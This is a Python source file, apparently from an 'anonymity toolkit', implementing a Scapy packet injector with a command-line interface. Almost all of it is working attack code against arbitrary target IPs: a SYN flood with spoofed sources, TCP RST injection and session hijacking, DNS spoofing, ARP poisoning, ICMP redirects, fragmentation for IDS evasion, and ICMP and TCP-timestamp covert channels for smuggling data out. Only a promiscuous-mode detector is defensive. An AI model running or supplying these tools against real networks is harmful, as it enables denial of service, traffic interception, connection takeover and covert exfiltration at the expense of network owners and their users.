#!/usr/bin/env python3
"""
Packet Injector - Advanced packet crafting and injection
Part of Lackadaisical Anonymity Toolkit
"""

import os
import sys
import time
import struct
import socket
import argparse
from typing import Optional, List, Tuple
from scapy.all import *

class PacketInjector:
    """Advanced packet injection and manipulation"""
    
    def __init__(self, interface: Optional[str] = None):
        self.interface = interface or conf.iface
        self.socket = None
        
    def craft_tcp_packet(self, src_ip: str, dst_ip: str, 
                        src_port: int, dst_port: int,
                        flags: str = 'S', seq: int = 0, 
                        ack: int = 0, payload: bytes = b'') -> IP:
        """Craft custom TCP packet"""
        # Create IP layer
        ip = IP(src=src_ip, dst=dst_ip)
        
        # Parse TCP flags
        tcp_flags = 0
        flag_map = {
            'F': 0x01,  # FIN
            'S': 0x02,  # SYN
            'R': 0x04,  # RST
            'P': 0x08,  # PSH
            'A': 0x10,  # ACK
            'U': 0x20,  # URG
            'E': 0x40,  # ECE
            'C': 0x80   # CWR
        }
        
        for flag in flags.upper():
            if flag in flag_map:
                tcp_flags |= flag_map[flag]
        
        # Create TCP layer
        tcp = TCP(sport=src_port, dport=dst_port, 
                 flags=tcp_flags, seq=seq, ack=ack)
        
        # Add payload if provided
        packet = ip/tcp
        if payload:
            packet = packet/Raw(payload)
        
        return packet
    
    def syn_flood(self, target_ip: str, target_port: int, 
                  count: int = 1000, random_source: bool = True):
        """Perform SYN flood attack"""
        print(f"Starting SYN flood on {target_ip}:{target_port}")
        
        for i in range(count):
            if random_source:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}." \
                        f"{random.randint(1,255)}.{random.randint(1,255)}"
            else:
                src_ip = get_if_addr(self.interface)
            
            src_port = random.randint(1024, 65535)
            
            packet = self.craft_tcp_packet(
                src_ip, target_ip, src_port, target_port, 
                flags='S', seq=random.randint(0, 2**32-1)
            )
            
            send(packet, iface=self.interface, verbose=False)
            
            if i % 100 == 0:
                print(f"Sent {i} packets...")
        
        print(f"SYN flood complete - sent {count} packets")
    
    def tcp_rst_injection(self, src_ip: str, dst_ip: str,
                         src_port: int, dst_port: int, seq: int):
        """Inject TCP RST packet to terminate connection"""
        packet = self.craft_tcp_packet(
            src_ip, dst_ip, src_port, dst_port,
            flags='R', seq=seq
        )
        
        send(packet, iface=self.interface, verbose=False)
        print(f"RST packet injected: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
    
    def dns_spoof(self, domain: str, fake_ip: str, 
                  target_ip: Optional[str] = None):
        """Spoof DNS responses"""
        def process_packet(packet):
            if packet.haslayer(DNSQR) and packet[DNSQR].qname.decode() == domain + '.':
                # Create spoofed response
                spoofed = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                         UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))
                
                send(spoofed, iface=self.interface, verbose=False)
                print(f"Spoofed DNS response: {domain} -> {fake_ip}")
        
        print(f"Starting DNS spoofing for {domain} -> {fake_ip}")
        
        filter_exp = f"udp port 53"
        if target_ip:
            filter_exp += f" and src host {target_ip}"
        
        sniff(filter=filter_exp, prn=process_packet, 
              iface=self.interface, store=0)
    
    def arp_poison(self, target_ip: str, gateway_ip: str):
        """Perform ARP poisoning attack"""
        # Get MAC addresses
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            print("Could not resolve MAC addresses")
            return
        
        print(f"ARP poisoning: {target_ip} <-> {gateway_ip}")
        print("Press Ctrl+C to stop")
        
        try:
            while True:
                # Tell target we are gateway
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                        psrc=gateway_ip), verbose=False)
                
                # Tell gateway we are target
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                        psrc=target_ip), verbose=False)
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\nRestoring ARP tables...")
            
            # Restore target
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=gateway_mac), count=3)
            
            # Restore gateway
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=target_mac), count=3)
            
            print("ARP tables restored")
    
    def icmp_redirect(self, target_ip: str, gateway_ip: str, 
                     new_gateway: str):
        """Send ICMP redirect to change routing"""
        # Craft ICMP redirect
        packet = IP(src=gateway_ip, dst=target_ip)/\
                ICMP(type=5, code=1, gw=new_gateway)/\
                IP(src=target_ip, dst='8.8.8.8')/\
                UDP(sport=random.randint(1024, 65535), dport=53)
        
        send(packet, iface=self.interface, verbose=False)
        print(f"ICMP redirect sent: {target_ip} -> {new_gateway}")
    
    def tcp_hijack(self, src_ip: str, dst_ip: str,
                  src_port: int, dst_port: int,
                  seq: int, ack: int, payload: bytes):
        """Hijack TCP session"""
        packet = self.craft_tcp_packet(
            src_ip, dst_ip, src_port, dst_port,
            flags='PA', seq=seq, ack=ack, payload=payload
        )
        
        send(packet, iface=self.interface, verbose=False)
        print(f"TCP hijack packet sent with {len(payload)} bytes")
    
    def fragment_packet(self, packet: IP, frag_size: int = 8) -> List[IP]:
        """Fragment IP packet for IDS evasion"""
        data = bytes(packet)
        fragments = []
        
        # Remove IP header (20 bytes)
        ip_header = data[:20]
        payload = data[20:]
        
        # Fragment payload
        offset = 0
        while offset < len(payload):
            frag_data = payload[offset:offset + frag_size]
            
            # Create fragment
            frag = IP(src=packet.src, dst=packet.dst)
            frag.flags = 'MF' if offset + frag_size < len(payload) else 0
            frag.frag = offset // 8
            frag.proto = packet.proto
            
            fragments.append(frag/Raw(frag_data))
            offset += frag_size
        
        return fragments
    
    def covert_channel_icmp(self, target_ip: str, data: bytes):
        """Send data through ICMP echo requests (covert channel)"""
        print(f"Sending {len(data)} bytes through ICMP covert channel")
        
        # Split data into chunks
        chunk_size = 32  # Bytes per ICMP packet
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            
            # Hide data in ICMP payload
            packet = IP(dst=target_ip)/ICMP()/Raw(chunk)
            send(packet, iface=self.interface, verbose=False)
            
            time.sleep(0.1)  # Avoid detection
        
        print("Covert channel transmission complete")
    
    def tcp_timestamp_covert_channel(self, target_ip: str, 
                                   target_port: int, data: bytes):
        """Hide data in TCP timestamps"""
        print("Sending data through TCP timestamp covert channel")
        
        src_port = random.randint(1024, 65535)
        
        # Encode data in timestamps
        for byte in data:
            # Hide byte value in timestamp
            timestamp = (int(time.time()) & 0xFFFFFF00) | byte
            
            packet = IP(dst=target_ip)/TCP(
                sport=src_port, 
                dport=target_port,
                flags='S',
                options=[('Timestamp', (timestamp, 0))]
            )
            
            send(packet, iface=self.interface, verbose=False)
            time.sleep(0.5)
        
        print("Covert channel transmission complete")
    
    def detect_promiscuous_mode(self, target_ip: str) -> bool:
        """Detect if target is in promiscuous mode"""
        # Send ARP request with wrong MAC broadcast
        # Only promiscuous mode will respond
        
        fake_mac = "FF:FF:FF:FF:FF:FE"  # Not broadcast
        
        packet = Ether(dst=fake_mac)/ARP(pdst=target_ip)
        
        response = srp1(packet, timeout=2, iface=self.interface, verbose=False)
        
        if response:
            print(f"{target_ip} is in promiscuous mode!")
            return True
        else:
            print(f"{target_ip} is not in promiscuous mode")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='Packet Injector - Advanced packet manipulation'
    )
    
    parser.add_argument('-i', '--interface', help='Network interface')
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # SYN flood
    syn_parser = subparsers.add_parser('syn-flood', help='SYN flood attack')
    syn_parser.add_argument('target', help='Target IP')
    syn_parser.add_argument('port', type=int, help='Target port')
    syn_parser.add_argument('-c', '--count', type=int, default=1000,
                           help='Number of packets')
    syn_parser.add_argument('--no-random-source', action='store_true',
                           help='Use real source IP')
    
    # DNS spoof
    dns_parser = subparsers.add_parser('dns-spoof', help='DNS spoofing')
    dns_parser.add_argument('domain', help='Domain to spoof')
    dns_parser.add_argument('fake_ip', help='Fake IP address')
    dns_parser.add_argument('--target', help='Target IP (optional)')
    
    # ARP poison
    arp_parser = subparsers.add_parser('arp-poison', help='ARP poisoning')
    arp_parser.add_argument('target', help='Target IP')
    arp_parser.add_argument('gateway', help='Gateway IP')
    
    # TCP RST
    rst_parser = subparsers.add_parser('tcp-rst', help='TCP RST injection')
    rst_parser.add_argument('src_ip', help='Source IP')
    rst_parser.add_argument('dst_ip', help='Destination IP')
    rst_parser.add_argument('src_port', type=int, help='Source port')
    rst_parser.add_argument('dst_port', type=int, help='Destination port')
    rst_parser.add_argument('seq', type=int, help='Sequence number')
    
    # Promiscuous detection
    prom_parser = subparsers.add_parser('detect-promisc', 
                                       help='Detect promiscuous mode')
    prom_parser.add_argument('target', help='Target IP')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # Check for root
    if os.geteuid() != 0:
        print("This tool requires root privileges")
        sys.exit(1)
    
    injector = PacketInjector(args.interface)
    
    try:
        if args.command == 'syn-flood':
            injector.syn_flood(args.target, args.port, args.count,
                             not args.no_random_source)
        
        elif args.command == 'dns-spoof':
            injector.dns_spoof(args.domain, args.fake_ip, args.target)
        
        elif args.command == 'arp-poison':
            injector.arp_poison(args.target, args.gateway)
        
        elif args.command == 'tcp-rst':
            injector.tcp_rst_injection(args.src_ip, args.dst_ip,
                                     args.src_port, args.dst_port, args.seq)
        
        elif args.command == 'detect-promisc':
            injector.detect_promiscuous_mode(args.target)
            
    except KeyboardInterrupt:
        print("\nInterrupted by user")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
